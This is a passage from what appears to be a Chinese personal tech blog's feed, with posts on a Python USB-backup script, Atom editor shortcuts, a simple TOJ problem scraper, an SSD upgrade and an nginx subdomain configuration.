<h2 id="Python源码"><a href="#Python源码" class="headerlink" title="Python源码"></a>Python源码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> datetime</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> os.path</div><div class="line"><span class="keyword">import</span> zipfile</div><div class="line"><span class="keyword">import</span> glob</div><div class="line"><span class="keyword">from</span> zipfile <span class="keyword">import</span> ZIP_DEFLATED</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetFileList</span><span class="params">(dir, fileList)</span>:</span></div><div class="line">    newDir = dir</div><div class="line">    <span class="keyword">if</span> os.path.isfile(dir):</div><div class="line">        fileList.append(dir)</div><div class="line">    <span class="keyword">elif</span> os.path.isdir(dir):</div><div class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> os.listdir(dir):</div><div class="line">            <span class="keyword">if</span> s == <span class="string">"System Volume Information"</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            newDir = os.path.join(dir, s)</div><div class="line">            GetFileList(newDir, fileList)</div><div class="line">    <span class="keyword">return</span> fileList</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup</span><span class="params">(filepath)</span>:</span></div><div class="line"></div><div class="line">    from_dir = []</div><div class="line">    <span class="comment"># print from_dir</span></div><div class="line">    from_dir = <span class="string">'G:\\'</span></div><div class="line">    <span class="comment"># backup_time</span></div><div class="line">    back_time = time.strftime(<span class="string">u'%Y-%m-%d'</span>)</div><div class="line"></div><div class="line">    to_dir = filepath + <span class="string">u':\\backup'</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(to_dir):</div><div class="line">        os.mkdir(to_dir)</div><div class="line">        <span class="keyword">print</span> <span class="string">u'Completely New Folder.'</span></div><div class="line">    os.chdir(to_dir)</div><div class="line"></div><div class="line">    target = back_time + <span class="string">u'.zip'</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target):</div><div class="line">        zip = zipfile.ZipFile(target, <span class="string">'a'</span>, ZIP_DEFLATED)</div><div class="line">        file = GetFileList(from_dir, [])</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> file:</div><div class="line">            zip.write(f)</div><div class="line">        <span class="keyword">print</span> <span class="string">u'Done.'</span></div><div class="line">        zip.close()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">u'Having Backups.'</span></div><div class="line"></div><div class="line">    os.chdir(to_dir)</div><div class="line">    list_file = os.listdir(to_dir)</div><div class="line"></div><div class="line">    old_time = datetime.date.today() - datetime.timedelta(<span class="number">30</span>)</div><div class="line">    <span class="comment"># print str(old_time)[5:7]</span></div><div class="line">    <span class="keyword">for</span> lis <span class="keyword">in</span> list_file:</div><div class="line">        <span class="keyword">if</span> lis[<span class="number">5</span>:<span class="number">7</span>] == str(old_time)[<span class="number">5</span>:<span class="number">7</span>]:</div><div class="line">            os.remove(lis)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'G:'</span>) == <span class="keyword">True</span>:</div><div class="line">        backup(<span class="string">'D'</span>)</div></pre></td></tr></table></figure>
<h2 id="简单解释"><a href="#简单解释" class="headerlink" title="简单解释"></a>简单解释</h2><p>上述源码中定义了两个函数：</p>
<ul>
<li>GetFileList(dir, fileList): 返回dir下的所有目录和文件</li>
<li>backup(filepath): 将U盘下的所有文件以日期命名打包，并放在filepath下的backup目录下</li>
</ul>
<h2 id="可改进的地方"><a href="#可改进的地方" class="headerlink" title="可改进的地方"></a>可改进的地方</h2><p>本来的想法是当插入U盘是即可自动执行备份操作，但是才知道Windows已经禁用了U盘的自动播放，故没有实现这一功能<br>后来想到，或许可以在电脑上设计一个定时打开的任务，当它打开时如果电脑插着U盘就备份，这样应该也能做到自动备份的效果，有空再做吧<br>自己还是太年轻啊，这些很简单的操作都不会[哭脸]</p>
<h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><p>Follow 我的<a href="https://github.com/xzjqx/python-study" target="_blank" rel="external">Python学习项目</a>吧，大家一起进步</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;前几天去学校机房做实验，U盘果然又被机房电脑玷污了，又只能格式化了（衰~）&lt;br&gt;思考解决办法，想着如果每当电脑插入U盘，就自动备份U盘里的文件就好了&lt;/p&gt;
&lt;h1 id=&quot;行动&quot;&gt;&lt;a href=&quot;#行动&quot; class=&quot;headerlink&quot; title=&quot;行动&quot;&gt;&lt;/a&gt;行动&lt;/h1&gt;&lt;p&gt;想到就做吧，正好这几天在学习Python，那就用python来实现这个小脚本吧&lt;br&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="http://xzjqx.data/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://xzjqx.data/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>【转】Atom快捷操作和插件推荐</title>
    <link href="http://xzjqx.data/2016/03/31/%E3%80%90%E8%BD%AC%E3%80%91Atom%E5%BF%AB%E6%8D%B7%E6%93%8D%E4%BD%9C%E5%92%8C%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    <id>http://xzjqx.data/2016/03/31/【转】Atom快捷操作和插件推荐/</id>
    <published>2016-03-30T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.581Z</updated>
    
    <content type="html"><![CDATA[<!-- Title: 【转】Atom快捷操作和插件推荐 Date: 2016年03月31日 -->
<p>原文查看：<a href="https://github.com/futantan/atom" target="_blank" rel="external">atom 快捷键 shortcuts</a></p>
<h2 id="文件切换"><a href="#文件切换" class="headerlink" title="文件切换"></a>文件切换</h2><p><code>ctrl-shift-s</code>  保存所有打开的文件<br><code>cmd-shift-o</code>  打开目录<br><code>cmd-\</code>   显示或隐藏目录树<br><code>ctrl-0</code>   焦点移到目录树<br>目录树下，使用a，m，delete来增加，修改和删除<br><code>cmd-t</code>或<code>cmd-p</code> 查找文件<br><code>cmd-b</code> 在打开的文件之间切换<br><code>cmd-shift-b</code> 只搜索从上次git commit后修改或者新增的文件<br><a id="more"></a></p>
<h2 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h2><p>（等价于上下左右）<br><code>ctrl-p</code> 前一行<br><code>ctrl-n</code> 后一行<br><code>ctrl-f</code> 前一个字符<br><code>ctrl-b</code> 后一个字符</p>
<p><code>alt-B</code>, <code>alt-left</code> 移动到单词开始<br><code>alt-F</code>, <code>alt-right</code> 移动到单词末尾</p>
<p><code>cmd-right</code>, <code>ctrl-E</code> 移动到一行结束<br><code>cmd-left</code>, <code>ctrl-A</code>  移动到一行开始</p>
<p><code>cmd-up</code> 移动到文件开始<br><code>cmd-down</code> 移动到文件结束</p>
<p><code>ctrl-g</code> 移动到指定行 row:column 处</p>
<p><code>cmd-r</code> 在方法之间跳转</p>
<h2 id="目录树操作"><a href="#目录树操作" class="headerlink" title="目录树操作"></a>目录树操作</h2><p><code>cmd-\</code> 或者 <code>cmd-k cmd-b</code> 显示(隐藏)目录树<br><code>ctrl-0</code> 焦点切换到目录树(再按一次或者<code>Esc</code>退出目录树)<br><code>a</code> 添加文件<br><code>d</code> 将当前文件另存为(duplicate)<br><code>i</code> 显示(隐藏)版本控制忽略的文件<br><code>alt-right</code> 和 <code>alt-left</code> 展开(隐藏)所有目录<br><code>ctrl-al-]</code> 和 <code>ctrl-al-[</code> 同上<br><code>ctrl-[</code> 和 <code>ctrl-]</code> 展开(隐藏)当前目录<br><code>ctrl-f</code> 和 <code>ctrl-b</code> 同上<br><code>cmd-k h</code> 或者 <code>cmd-k left</code> 在左半视图中打开文件<br><code>cmd-k j</code> 或者 <code>cmd-k down</code> 在下半视图中打开文件<br><code>cmd-k k</code> 或者 <code>cmd-k up</code> 在上半视图中打开文件<br><code>cmd-k l</code> 或者 <code>cmd-k right</code> 在右半视图中打开文件<br><code>ctrl-shift-C</code> 复制当前文件绝对路径</p>
<h2 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h2><p><code>cmd-F2</code> 在本行增加书签<br><code>F2</code> 跳到当前文件的下一条书签<br><code>shift-F2</code> 跳到当前文件的上一条书签<br><code>ctrl-F2</code> 列出当前工程所有书签</p>
<h2 id="选取"><a href="#选取" class="headerlink" title="选取"></a>选取</h2><blockquote>
<p>大部分和导航一致，只不过加上shift</p>
</blockquote>
<p><code>ctrl-shift-P</code>  选取至上一行<br><code>ctrl-shift-N</code>  选取至下一样<br><code>ctrl-shift-B</code>  选取至前一个字符<br><code>ctrl-shift-F</code>  选取至后一个字符<br><code>alt-shift-B</code>, <code>alt-shift-left</code>  选取至字符开始<br><code>alt-shift-F</code>, <code>alt-shift-right</code>  选取至字符结束<br><code>ctrl-shift-E</code>, <code>cmd-shift-right</code>  选取至本行结束<br><code>ctrl-shift-A</code>, <code>cmd-shift-left</code>  选取至本行开始<br><code>cmd-shift-up</code>  选取至文件开始<br><code>cmd-shift-down</code>  选取至文件结尾<br><code>cmd-A</code>  全选<br><code>cmd-L</code>  选取一行，继续按回选取下一行<br><code>ctrl-shift-W</code>  选取当前单词</p>
<h2 id="编辑和删除文本"><a href="#编辑和删除文本" class="headerlink" title="编辑和删除文本"></a>编辑和删除文本</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><code>ctrl-T</code> 使光标前后字符交换<br><code>cmd-J</code> 将下一行与当前行合并<br><code>ctrl-cmd-up</code>, <code>ctrl-cmd-down</code> 使当前行向上或者向下移动<br><code>cmd-shift-D</code> 复制当前行到下一行<br><code>cmd-K</code>, <code>cmd-U</code> 使当前字符大写<br><code>cmd-K</code>, <code>cmd-L</code> 使当前字符小写</p>
<h3 id="删除和剪切"><a href="#删除和剪切" class="headerlink" title="删除和剪切"></a>删除和剪切</h3><p><code>ctrl-shift-K</code> 删除当前行<br><code>cmd-backspace</code> 删除到当前行开始<br><code>cmd-fn-backspace</code> 删除到当前行结束<br><code>ctrl-K</code> 剪切到当前行结束<br><code>alt-backspace</code> 或 <code>alt-H</code> 删除到当前单词开始<br><code>alt-delete</code> 或 <code>alt-D</code> 删除到当前单词结束</p>
<h3 id="多光标和多处选取"><a href="#多光标和多处选取" class="headerlink" title="多光标和多处选取"></a>多光标和多处选取</h3><p><code>cmd-click</code> 增加新光标<br><code>cmd-shift-L</code> 将多行选取改为多行光标<br><code>ctrl-shift-up</code>, <code>ctrl-shift-down</code> 增加上（下）一行光标<br><code>cmd-D</code> 选取文档中和当前单词相同的下一处<br><code>ctrl-cmd-G</code> 选取文档中所有和当前光标单词相同的位置</p>
<h3 id="括号跳转"><a href="#括号跳转" class="headerlink" title="括号跳转"></a>括号跳转</h3><p><code>ctrl-m</code> 相应括号之间，html tag之间等跳转<br><code>ctrl-cmd-m</code> 括号(tag)之间文本选取<br><code>alt-cmd-.</code> 关闭当前XML/HTML tag</p>
<h3 id="编码方式"><a href="#编码方式" class="headerlink" title="编码方式"></a>编码方式</h3><p><code>ctrl-shift-U</code> 调出切换编码选项</p>
<h2 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h2><p><code>cmd-F</code> 在buffer中查找<br><code>cmd-shift-f</code> 在整个工程中查找</p>
<h2 id="代码片段"><a href="#代码片段" class="headerlink" title="代码片段"></a>代码片段</h2><p><code>alt-shift-S</code> 查看当前可用代码片段</p>
<blockquote>
<p>在<code>~/.atom</code>目录下<code>snippets.cson</code>文件中存放了你定制的snippets</p>
</blockquote>
<p><a href="https://atom.io/docs/v1.0.0/using-atom-snippets" target="_blank" rel="external">定制说明</a></p>
<h2 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h2><p><code>ctrl-space</code> 提示补全信息</p>
<h2 id="折叠"><a href="#折叠" class="headerlink" title="折叠"></a>折叠</h2><p><code>alt-cmd-[</code> 折叠<br><code>alt-cmd-]</code> 展开<br><code>alt-cmd-shift-{</code> 折叠全部<br><code>alt-cmd-shift-}</code> 展开全部<br><code>cmd-k cmd-N</code> 指定折叠层级 N为层级数</p>
<h2 id="文件语法高亮"><a href="#文件语法高亮" class="headerlink" title="文件语法高亮"></a>文件语法高亮</h2><p><code>ctrl-shift-L</code> 选择文本类型</p>
<h2 id="使用Atom进行写作"><a href="#使用Atom进行写作" class="headerlink" title="使用Atom进行写作"></a>使用Atom进行写作</h2><p><code>ctrl-shift-M</code> Markdown预览<br>可用代码片段</p>
<blockquote>
<p>b, legal, img, l, i, code, t, table</p>
</blockquote>
<h2 id="git操作"><a href="#git操作" class="headerlink" title="git操作"></a>git操作</h2><p><code>cmd-alt-Z</code> checkout HEAD 版本<br><code>cmd-shift-B</code> 弹出untracked 和 modified文件列表<br><code>alt-g down</code> <code>alt-g up</code> 在修改处跳转<br><code>alt-G D</code> 弹出diff列表<br><code>alt-G O</code> 在github上打开文件<br><code>alt-G G</code> 在github上打开项目地址<br><code>alt-G B</code> 在github上打开文件blame<br><code>alt-G H</code> 在github上打开文件history<br><code>alt-G I</code> 在github上打开issues<br><code>alt-G R</code> 在github打开分支比较<br><code>alt-G C</code> 拷贝当前文件在gihub上的网址</p>
<h2 id="推荐一些好用的插件"><a href="#推荐一些好用的插件" class="headerlink" title="推荐一些好用的插件"></a>推荐一些好用的插件</h2><ul>
<li>主题<br><a href="https://atom.io/themes/atom-material-ui" target="_blank" rel="external">atom-material-ui</a> 好看到爆<br><a href="https://atom.io/themes/atom-material-syntax" target="_blank" rel="external">atom-material-syntax</a></li>
<li>美化<br><a href="https://atom.io/packages/atom-beautify" target="_blank" rel="external">atom-beautify</a> 一键代码美化<br><a href="https://atom.io/packages/file-icons" target="_blank" rel="external">file-icons</a> 给文件加上好看的图标<br><a href="https://atom.io/users/atom-minimap" target="_blank" rel="external">atom-minimap</a> 方便美观的缩略滚动图</li>
<li>git<br><a href="https://atom.io/packages/atomatigit" target="_blank" rel="external">atomatigit</a> 可视化git操作</li>
<li>代码提示<br><a href="https://atom.io/packages/emmet" target="_blank" rel="external">emmet</a> 这个不用介绍了吧<br><a href="https://atom.io/packages/atom-ternjs" target="_blank" rel="external">atom-ternjs</a> js代码提示很强大，高度定制化<br><a href="https://atom.io/packages/docblockr" target="_blank" rel="external">docblockr</a> jsdoc 给js添加注释<br><a href="https://atom.io/packages/autoclose-html" target="_blank" rel="external">autoclose-html</a> 闭合html标签<br><a href="https://atom.io/packages/color-picker" target="_blank" rel="external">color-picker</a> 取色器 必备插件<br><a href="https://atom.io/packages/pigments" target="_blank" rel="external">pigments</a> 颜色显示插件 必装<br><a href="https://atom.io/packages/terminal-panel" target="_blank" rel="external">terminal-panel</a> 直接在atom里面写命令了<br><a href="https://atom.io/packages/svg-preview" target="_blank" rel="external">svg-preview</a> svg预览</li>
<li>便捷操作<br><a href="https://atom.io/packages/advanced-open-file" target="_blank" rel="external">advanced-open-file</a> 快速打开、切换文件</li>
</ul>]]></content>
    
    <summary type="html">
    
      &lt;!-- Title: 【转】Atom快捷操作和插件推荐 Date: 2016年03月31日 --&gt;
&lt;p&gt;原文查看：&lt;a href=&quot;https://github.com/futantan/atom&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;atom 快捷键 shortcuts&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;文件切换&quot;&gt;&lt;a href=&quot;#文件切换&quot; class=&quot;headerlink&quot; title=&quot;文件切换&quot;&gt;&lt;/a&gt;文件切换&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ctrl-shift-s&lt;/code&gt;  保存所有打开的文件&lt;br&gt;&lt;code&gt;cmd-shift-o&lt;/code&gt;  打开目录&lt;br&gt;&lt;code&gt;cmd-\&lt;/code&gt;   显示或隐藏目录树&lt;br&gt;&lt;code&gt;ctrl-0&lt;/code&gt;   焦点移到目录树&lt;br&gt;目录树下，使用a，m，delete来增加，修改和删除&lt;br&gt;&lt;code&gt;cmd-t&lt;/code&gt;或&lt;code&gt;cmd-p&lt;/code&gt; 查找文件&lt;br&gt;&lt;code&gt;cmd-b&lt;/code&gt; 在打开的文件之间切换&lt;br&gt;&lt;code&gt;cmd-shift-b&lt;/code&gt; 只搜索从上次git commit后修改或者新增的文件&lt;br&gt;
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="Atom" scheme="http://xzjqx.data/tags/Atom/"/>
    
  </entry>
  
  <entry>
    <title>简单Python爬虫练习</title>
    <link href="http://xzjqx.data/2016/03/27/python-test/"/>
    <id>http://xzjqx.data/2016/03/27/python-test/</id>
    <published>2016-03-26T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.578Z</updated>
    
    <content type="html"><![CDATA[<!-- Title: 简单Python爬虫练习 Date: 2016年03月27日 -->
<p>最近开始学习Python的爬虫，在这里做一个记录</p>
<p>首先，我读了一些简单的Python爬虫源码，然后通过入门教程理解代码的意义（这里有一个比较好的入门教程——–<a href="http://wuchong.me/blog/2014/04/24/easy-web-scraping-with-python/" target="_blank" rel="external">使用 Python 轻松抓取网页</a>），最后自己动手写了一个小的爬虫程序。<br><a id="more"></a><br>我的爬虫测试程序源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*-coding:utf8-*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> bs4</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">root_url = <span class="string">'http://acm.tju.edu.cn/toj/'</span></div><div class="line">pageNum = <span class="number">100</span></div><div class="line">result = <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1001</span>,pageNum+<span class="number">1001</span>):</div><div class="line">    index_url = root_url + <span class="string">'showp%d.html'</span>%(page)</div><div class="line">    response = requests.get(index_url)</div><div class="line">    soup = bs4.BeautifulSoup(response.text,<span class="string">'lxml'</span>)</div><div class="line"></div><div class="line">    problem = soup.select(<span class="string">'#problem'</span>)[<span class="number">0</span>].get_text()</div><div class="line">    fo = open(<span class="string">"/mydata/python_test/toj/problem%d"</span>%page, <span class="string">"wb"</span>)</div><div class="line">    fo.write(problem)</div></pre></td></tr></table></figure></p>
<p>这里我记录一下上述代码的意思： 这是一个爬取TOJ网站题目主干的小程序     首先使用requests来加载一个<a href="http://acm.tju.edu.cn/toj/showp1001.html" target="_blank" rel="external"> web 页面</a> 查看该网页的源代码中与题目内容有关的部分如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">"+2"</span>&gt;</span>1001.<span class="tag">&lt;/<span class="name">font</span>&gt;</span> &amp;nbsp;</div><div class="line">    <span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">"+2"</span> <span class="attr">color</span>=<span class="string">"blue"</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">font</span>&gt;</span></div><div class="line">    ...</div><div class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"problem"</span>&gt;</span></div><div class="line">    ...</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>center标签的前两个font标签分别记录了题目编号和题目标题<br>div标签的problem类记录了题目内容，我通过 BeautifulSoup 使用 CSS 选择器抽取他们的文本<br>最终加入problem串中，写入文件</p>
<p>上面就完成了对一个页面题目内容的提取，只需循环处理你想要的页面即可</p>]]></content>
    
    <summary type="html">
    
      &lt;!-- Title: 简单Python爬虫练习 Date: 2016年03月27日 --&gt;
&lt;p&gt;最近开始学习Python的爬虫，在这里做一个记录&lt;/p&gt;
&lt;p&gt;首先，我读了一些简单的Python爬虫源码，然后通过入门教程理解代码的意义（这里有一个比较好的入门教程——–&lt;a href=&quot;http://wuchong.me/blog/2014/04/24/easy-web-scraping-with-python/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;使用 Python 轻松抓取网页&lt;/a&gt;），最后自己动手写了一个小的爬虫程序。&lt;br&gt;
    
    </summary>
    
      <category term="学习笔记" scheme="http://xzjqx.data/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://xzjqx.data/tags/python/"/>
    
      <category term="爬虫" scheme="http://xzjqx.data/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>为小y更换固态硬盘</title>
    <link href="http://xzjqx.data/2016/03/14/Swap-SSD/"/>
    <id>http://xzjqx.data/2016/03/14/Swap-SSD/</id>
    <published>2016-03-13T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.576Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: 为小y更换固态硬盘
Date: 2015年03月14日
-->
<p>前天心情一激动就在某东剁手买了一块SSD，昨天就到了（<del>不得不说某东的物流真不错</del>）<br>既然固态已经来了，那就大刀阔斧的开始动工吧。。。</p>
<a id="more"></a>
<p><img src="http://ww4.sinaimg.cn/bmiddle/5da56583jw1f1vmb4zdhfj21w02ioqv5.jpg" alt=""><br><img src="http://ww4.sinaimg.cn/bmiddle/5da56583jw1f1vn0uaze6j21w02ioqv5.jpg" alt=""><br>完工。。。过程比较曲折，这里就不赘述了，贴上宝贝的链接–<a href="http://item.jd.com/2010277.html" target="_blank" rel="external">SSD</a>和<a href="http://item.jd.com/1386945.html" target="_blank" rel="external">光驱托架</a></p>
<p>我是把SSD放在原机械的位置，把机械拆下来放在光驱上了，这样做是防止光驱位的接口不是SATA3的而影响固态的速度</p>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: 为小y更换固态硬盘
Date: 2015年03月14日
--&gt;
&lt;p&gt;前天心情一激动就在某东剁手买了一块SSD，昨天就到了（&lt;del&gt;不得不说某东的物流真不错&lt;/del&gt;）&lt;br&gt;既然固态已经来了，那就大刀阔斧的开始动工吧。。。&lt;/p&gt;
    
    </summary>
    
      <category term="随笔文章" scheme="http://xzjqx.data/categories/%E9%9A%8F%E7%AC%94%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="SSD" scheme="http://xzjqx.data/tags/SSD/"/>
    
  </entry>
  
  <entry>
    <title>LNMP中二级域名指向网站子目录</title>
    <link href="http://xzjqx.data/2015/12/29/lnmp-sld-to-sondir/"/>
    <id>http://xzjqx.data/2015/12/29/lnmp-sld-to-sondir/</id>
    <published>2015-12-28T18:03:42.000Z</published>
    <updated>2017-08-21T05:15:48.577Z</updated>
    
    <content type="html"><![CDATA[<!--
Title: LNMP中二级域名指向网站子目录
date: 2015年12月29日
-->
<p>最近真的比较闲啊，又开始折腾域名二服务器的事情了，下面就是过程</p>
<h2 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a><strong>二级域名</strong></h2><p>用下面这个例子帮助我们清晰的分清楚顶级域名、以及域名、二级域名：</p>
<ul>
<li>.com顶级域名</li>
<li>baidu .com 一级域名</li>
<li>www.baidu .com 二级域名</li>
<li>bbs.baidu .com 二级域名</li>
<li>tieba.baidu .com 二级域名<a id="more"></a>
<h2 id="网站子目录"><a href="#网站子目录" class="headerlink" title="网站子目录"></a><strong>网站子目录</strong></h2>我们可能会希望在自己的服务器上搭建多个网站，这时候如果把所有的网站文件都放在一个目录下，可能会造成一些冲突或<del>强迫症</del>？（我是后者多一点）<br>那这个时候我们就希望在一个文件夹里保存一个网站了，这就需要一个网站子目录了。</li>
</ul>
<p>可是这时候又有一个新的问题了，当我们想访问这个子目录是或许会是这样<strong>xxxx.cn/xx</strong>或是IP/xx这样<br>不管怎样都要输入繁琐的子目录名，这样是不是很麻烦。但是如果能让二级域名指向这个就行了，比如使用xx.xxxx.cn访问该子目录的网站，这样是不是很方便了</p>
<h2 id="二级域名指向子目录"><a href="#二级域名指向子目录" class="headerlink" title="二级域名指向子目录"></a><strong>二级域名指向子目录</strong></h2><p>现在我们知道用二级域名指向子目录的重要性了吧。<br>由于我是使用LNMP一键安装包安装的，所以下面的方法也是建立在LNMP上的，不一样的请右转百度。</p>
<p>首先在你的域名服务商添加一条解析记录，使用A记录即可，我的如下：<br><img src="http://7xo385.com1.z0.glb.clouddn.com/ng_A.png" alt="A记录"></p>
<p>之后就需要在服务器端做修改了：<br>首先进入nginx的配置文件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd /usr/local/nginx/conf/vhost</div></pre></td></tr></table></figure></p>
<p>如果之前已经通过LNMP搭好了自己的主域名网站（即使用vhost.sh脚本设置域名及默认文件夹，具体可看我的这篇文章<a href="http://xzjqx.cn/2015/12/23/build-wordpress/" target="_blank" rel="external">云服务器搭建WordPress个人博客系统</a>），这时<strong>vhost</strong>目录下会存在一个以“默认一级域名.conf”为名称的配置文件，我的就是<strong>xzjqx.cn.conf</strong></p>
<p>这时仿照一级域名的配置文件，我们新建一个二级域名的配置文件，我的例子如下：<br>文件名：ng.xzjqx.cn.conf<br>内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">server</div><div class="line">&#123;</div><div class="line">    listen 80;</div><div class="line">    server_name ng.xzjqx.cn;</div><div class="line">    index index.html index.htm index.php;</div><div class="line">    root /home/wwwroot/default/nginx;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中server_name后填入你的二级域名，root后填入网站子目录</p>
<p>最后重启您先服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx restart</div></pre></td></tr></table></figure></p>
<p>这样我们就能开开心心的使用指向二级域名访问网站子目录了<br>这是我上面所用的例子：<a href="ng.xzjqx.cn">ng.xzjqx.cn</a><br>这是LNMP安装完成后的默认主页</p>]]></content>
    
    <summary type="html">
    
      &lt;!--
Title: LNMP中二级域名指向网站子目录
date: 2015年12月29日
--&gt;
&lt;p&gt;最近真的比较闲啊，又开始折腾域名二服务器的事情了，下面就是过程&lt;/p&gt;
&lt;h2 id=&quot;二级域名&quot;&gt;&lt;a href=&quot;#二级域名&quot; class=&quot;headerlink&quot; title=&quot;二级域名&quot;&gt;&lt;/a&gt;&lt;strong&gt;二级域名&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;用下面这个例子帮助我们清晰的分清楚顶级域名、以及域名、二级域名：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.com顶级域名&lt;/li&gt;
&lt;li&gt;baidu .com 一级域名&lt;/li&gt;
&lt;li&gt;www.baidu .com 二级域名&lt;/li&gt;
&lt;li&gt;bbs.baidu .com 二级域名&lt;/li&gt;
&lt;li&gt;tieba.baidu .com 二级域名
    
    </summary>
    
      <category term="技术博文" scheme="http://xzjqx.data/categories/%E6%8A%80%E6%9C%AF%E5%8D%9A%E6%96%87/"/>
    
    
      <category term="LNMP" scheme="http://xzjqx.data/tags/LNMP/"/>
    
      <category term="二级域名" scheme="http://xzjqx.data/tags/%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>使用Sublime直接编译运行C/C++源文件</title>
